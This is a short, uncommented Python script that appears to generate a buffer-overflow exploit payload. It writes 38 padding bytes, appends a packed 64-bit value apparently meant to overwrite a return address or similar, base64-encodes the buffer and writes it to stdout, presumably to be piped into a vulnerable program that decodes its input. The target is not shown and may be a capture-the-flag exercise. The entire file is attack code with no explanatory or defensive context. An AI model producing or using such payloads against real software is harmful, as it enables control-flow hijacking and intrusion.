
import sys
import struct
import base64

buf = b'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK'
buf += struct.pack('<Q', 16192201149308070209)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
